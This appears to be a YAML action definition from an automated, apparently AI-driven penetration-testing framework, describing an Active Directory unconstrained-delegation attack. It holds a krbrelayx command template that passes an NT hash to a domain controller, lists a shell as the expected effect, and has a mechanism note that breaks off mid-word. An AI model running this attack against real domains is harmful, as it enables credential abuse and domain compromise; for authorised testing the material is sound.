name: unconstrained_delegation
category: ad
description: Exploit unconstrained delegation
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 krbrelayx.py -hashes ':{nt_hash}' --dc-ip {target_ip}
parser: impacket_parser
expected_effects:
- delegation_abused
- shell_obtained
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create
  up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you
  can set the newl
hacktricks_ref: windows-hardening/active-directory-methodology/kerberos-double-hop-problem.md
